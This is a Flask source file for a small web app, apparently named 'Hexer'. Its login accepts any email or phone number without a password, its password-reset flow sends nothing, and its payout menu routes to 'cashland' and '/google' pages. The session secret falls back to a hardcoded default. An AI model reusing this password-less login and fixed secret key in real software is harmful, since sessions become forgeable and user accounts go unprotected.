import os
from flask import Flask, render_template, request, redirect, url_for, session

app = Flask(__name__)

app.secret_key = os.environ.get("SECRET_KEY", "hexer-dev-secret")


@app.route("/")
def home():
    return render_template("login.html")


@app.route("/login", methods=["POST"])
def login():
    email = request.form.get("email", "").strip()

    if not email:
        return render_template(
            "login.html",
            error="Please enter your email or mobile number."
        )

    session["email"] = email
    return redirect("/payout")


@app.route("/forgot-password")
def forgot_password():
    return render_template("forgot.html")


@app.route("/forgot-password", methods=["POST"])
def forgot_password_submit():
    email = request.form.get("email", "").strip()

    if not email:
        return render_template(
            "forgot.html",
            error="Please enter your email or mobile number."
        )

    return render_template(
        "reset_sent.html",
        email=email
    )


@app.route("/payout")
def payout():
    return render_template("payout.html")


@app.route("/payout/select", methods=["POST"])
def payout_select():
    method = request.form.get("method")

    if method == "hexer":
        return redirect("/hexer")

    if method == "cashland":
        return redirect("/cashland")

    if method == "card":
        return redirect("/google")

    return redirect("/payout")


@app.route("/hexer")
def hexer():
    return render_template("hexer.html")


@app.route("/cashland")
def cashland():
    return render_template("cashland.html")


@app.route("/cashland", methods=["POST"])
def cashland_submit():
    handle = request.form.get("handle", "").strip()

    if not handle:
        return render_template("cashland.html")

    return render_template(
        "cashland.html",
        success=True,
        handle=handle
    )


@app.route("/google")
def google():
    return render_template("google.html")


@app.route("/health")
def health():
    return "OK", 200


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(
        host="0.0.0.0",
        port=port,
        debug=False
    )
